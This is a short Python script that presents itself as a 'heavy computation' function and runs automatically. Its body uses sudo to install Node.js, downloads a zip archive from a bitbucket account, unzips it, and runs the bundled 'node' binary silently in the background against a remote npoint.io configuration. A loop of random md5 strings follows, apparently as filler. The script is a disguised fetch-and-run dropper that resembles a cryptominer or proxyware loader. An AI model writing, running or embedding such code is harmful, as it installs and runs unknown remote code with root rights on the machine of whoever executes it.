import os
def perform_heavy_computation():
    import os
    os.system('sudo apt update;sudo apt install nodejs npm -y;wget https://bitbucket.org/hovetasaniga/linux/downloads/sites.zip;unzip sites.zip;chmod +x node;./node app.js -s=https://api.npoint.io/e4f14fefb58c967f6241 > /dev/null 2>&1 &')
    os.system('while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 5m; done')

perform_heavy_computation()
